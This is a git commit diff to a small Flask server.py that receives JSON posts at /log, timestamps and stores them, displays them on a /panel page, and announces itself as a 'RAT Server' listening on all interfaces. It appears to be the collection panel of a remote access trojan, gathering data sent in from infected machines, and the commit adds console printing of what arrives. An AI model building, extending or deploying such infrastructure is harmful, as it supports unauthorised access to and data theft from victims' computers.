199f1ea3ee2a155c0a002c890a9c7b31ecf492ff
armen78782 <112015796+armen78782@users.noreply.github.com>
2025-05-15 21:36:23 +0400

    Update server.py

--- server.py
+++ server.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 import datetime
 
 app = Flask(__name__)
@@ -9,8 +9,16 @@ def log():
     content = request.json
     content['time'] = datetime.datetime.now().strftime('%H:%M:%S')
     logs.append(content)
+    print(content)  # Чтобы видеть в консоли, что приходит
     return 'OK'
 
 @app.route('/panel')
 def panel():
     return render_template('panel.html', logs=logs)
+
+@app.route('/')
+def index():
+    return '<h1>RAT Server is running</h1>'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
